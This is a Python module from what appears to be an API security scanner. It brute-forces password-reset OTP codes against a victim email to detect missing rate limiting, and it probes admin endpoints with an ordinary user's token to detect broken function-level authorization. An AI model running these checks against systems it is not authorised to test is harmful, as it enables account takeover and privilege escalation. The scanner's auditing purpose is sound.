"""
VAA — Auditoría de Autenticación y Autorización.

Contiene dos fases independientes:

  [API2] OTP Brute Force (Fase 5.7):
    Detecta endpoints de verificación OTP sin rate limiting.
    Dispara reset-password con email víctima, luego prueba OTPs 0000-9999
    (max 200 probes, concurrencia 10). Si ninguno provoca 429 → vuln confirmada.

  [API5] BFLA Vertical (Fase 2.5):
    Itera endpoints clasificados como 'admin' y los accede con token de usuario normal.
    Si devuelve 200 con contenido real (no redirect/login) → escalación confirmada.
"""
import asyncio
import re
from typing import Any, Dict, List

from app.utils.logger import logger  # pyre-ignore[21]
from app.core.engine.models import VulnerabilityFinding, EndpointTarget


async def run_otp_audit(
    endpoints: List[EndpointTarget],
    network_manager: Any,
    options: Dict[str, Any],
    victim_email: str,
    record_finding,
) -> None:
    """
    Fase 5.7: OTP Brute Force (API2 — Broken Authentication).

    Args:
        endpoints:      Manifiesto de endpoints.
        network_manager: NetworkManager del orquestador.
        options:        options{} del scan.
        victim_email:   Email de la víctima para iniciar el flujo OTP.
        record_finding: Coroutine para registrar hallazgos.
    """
    logger.info("\n=== [v4.0.0] FASE 5.7: OTP BRUTE FORCE (API2) ===")

    otp_pattern   = re.compile(r'(otp|verify|check|confirm|token)', re.IGNORECASE)
    reset_pattern = re.compile(r'(forget.passw|reset.passw|forgot|forgetpassword)', re.IGNORECASE)

    otp_eps = [
        ep for ep in endpoints
        if otp_pattern.search(ep.get("url", "") + ep.get("path", ""))
    ]
    reset_eps = [
        ep for ep in endpoints
        if reset_pattern.search(ep.get("url", "") + ep.get("path", ""))
    ]

    if not otp_eps:
        logger.info("[OTP] Sin endpoints OTP detectados — omitiendo")
        return

    logger.info(f"[OTP] {len(otp_eps)} endpoint(s) OTP | email víctima: {victim_email}")

    MAX_PROBES  = 200
    CONCURRENCY = 10

    for otp_ep in otp_eps[:3]:
        otp_url = otp_ep.get("url", "")
        if not otp_url:
            continue


        if reset_eps:
            reset_url = reset_eps[0].get("url", "")
            try:
                await network_manager.send_request_raw(
                    reset_url, method="POST",
                    payload={"email": victim_email},
                    json_body=True, timeout=8.0
                )
                logger.info(f"[OTP] Reset password enviado a {reset_url}")
            except Exception as exc:
                logger.debug(f"[OTP] Error disparando reset: {exc}")


        sem         = asyncio.Semaphore(CONCURRENCY)
        stop_event  = asyncio.Event()
        found_otp   = None
        rate_limited = False
        attempts    = 0

        async def try_otp(otp_code: str) -> bool:
            nonlocal found_otp, rate_limited, attempts  # pyre-ignore[26]
            if stop_event.is_set():
                return False
            async with sem:
                if stop_event.is_set():
                    return False
                try:
                    resp = await network_manager.send_request_raw(
                        otp_url, method="POST",
                        payload={"email": victim_email, "otp": otp_code},
                        json_body=True, timeout=5.0
                    )
                    if resp is None:
                        return False
                    attempts += 1  # pyre-ignore[26]
                    if resp.status_code == 429:
                        rate_limited = True  # pyre-ignore[26]
                        stop_event.set()
                        return True
                    if resp.status_code == 200:
                        found_otp = otp_code  # pyre-ignore[26]
                        stop_event.set()
                        return True
                except Exception:
                    pass
            return False

        await asyncio.gather(
            *[try_otp(f"{i:04d}") for i in range(MAX_PROBES)],
            return_exceptions=True
        )

        if found_otp:
            logger.warning(f"[OTP] 🚨 OTP VÁLIDO ENCONTRADO: {found_otp} @ {otp_url}")
            finding: VulnerabilityFinding = {  # type: ignore[assignment]
                "url": otp_url, "norm_url": otp_url,
                "type": "OTP_BRUTE_FORCE", "method": "POST",
                "payload": found_otp, "risk": "Critical",
                "confidence": 1.0, "verified": True,
                "validation_method": "otp_brute_force_success",
                "evidence_data": f"OTP válido '{found_otp}' encontrado tras {attempts} intentos sin bloqueo",
            }
            await record_finding(finding)

        elif not rate_limited and attempts >= 10:
            logger.warning(f"[OTP] 🚨 Sin rate limiting en {otp_url} ({attempts} intentos sin 429)")
            finding = {  # type: ignore[assignment]
                "url": otp_url, "norm_url": otp_url,
                "type": "OTP_BRUTE_FORCE", "method": "POST",
                "payload": "0000-9999 (numeric range)", "risk": "High",
                "confidence": 0.90, "verified": True,
                "validation_method": "no_rate_limiting_detected",
                "evidence_data": f"{attempts} intentos OTP sin recibir 429 — brute force posible",
            }
            await record_finding(finding)
        else:
            logger.info(f"[OTP] Rate limiting activo en {otp_url} ({attempts} intentos)")

    logger.info("[OTP] Fase OTP Brute Force completada")


async def run_bfla_vertical(
    endpoints: List[EndpointTarget],
    network_manager: Any,
    options: Dict[str, Any],
    m1_classify,
    record_finding,
) -> None:
    """
    Fase 2.5: BFLA Vertical (API5 — Broken Function Level Authorization).

    Itera endpoints clasificados como 'admin'/'config'/'health' y los accede
    con el token del ATACANTE (usuario normal). 200 con contenido real → vuln.

    Args:
        endpoints:     Manifiesto de endpoints.
        network_manager: NetworkManager.
        options:       options{} del scan.
        m1_classify:   M1.classify_endpoint_type(path, params) → str.
        record_finding: Coroutine para registrar hallazgos.
    """
    attacker_token = options.get("auth_token", "")
    if not attacker_token:
        logger.debug("[BFLA] Sin token de atacante. Fase BFLA omitida.")
        return

    logger.info("\n=== [v4.0.0] FASE 2.5: BFLA VERTICAL (API5) ===")

    target = options.get("target", "")

    admin_eps = [
        ep for ep in endpoints
        if m1_classify(
            ep.get("path", ep.get("url", "").replace(target, "")), {}
        ) in ("admin", "config", "health")
        and ep.get("source") != "markov_prediction"
    ]

    if not admin_eps:
        logger.info("[BFLA] No se encontraron endpoints admin en el manifiesto.")
        return

    logger.info(f"[BFLA] Probando {len(admin_eps)} endpoint(s) admin con token normal...")

    auth_hdr = (
        attacker_token if attacker_token.lower().startswith("bearer ")
        else f"Bearer {attacker_token}"
    )

    async with network_manager.create_client() as client:
        for ep in admin_eps[:15]:
            url = ep.get("url", "")
            try:
                resp = await network_manager.send_request(
                    url, method="GET",
                    custom_headers={"Authorization": auth_hdr}
                )
                if resp and resp.status_code == 200 and len(resp.content) > 50:
                    low = resp.text[:200].lower()
                    is_redirect = any(kw in low for kw in ["login", "sign in", "redirect", "<!doctype html"])
                    if not is_redirect:
                        logger.warning(f"[BFLA] Endpoint admin accesible con token normal: {url}")
                        finding: VulnerabilityFinding = {  # type: ignore[assignment]
                            "url": url, "norm_url": url,
                            "type": "BFLA_VERTICAL (Privilege Escalation)",
                            "method": "GET",
                            "payload": f"Authorization: {auth_hdr[:40]}...",
                            "risk": "High", "confidence": 0.90, "verified": True,
                            "validation_method": "bfla_attacker_token_200",
                            "response_text": resp.text[:300],
                            "ai_razonamiento": (
                                f"El endpoint admin `{url}` devolvió HTTP 200 con token "
                                "de usuario normal. Un atacante con cuenta básica puede "
                                "ejecutar funciones administrativas (API5 BFLA)."
                            ),
                            "ai_remediacion": (
                                "Implementar verificación de rol en CADA endpoint admin. "
                                "No confiar solo en ocultar las URLs. "
                                "Usar RBAC (Role-Based Access Control) a nivel de servidor."
                            ),
                        }
                        await record_finding(finding)
            except Exception as exc:
                logger.debug(f"[BFLA] Error en {url}: {exc}")

    bfla_count = 0
    logger.info("[BFLA] Fase completada.")
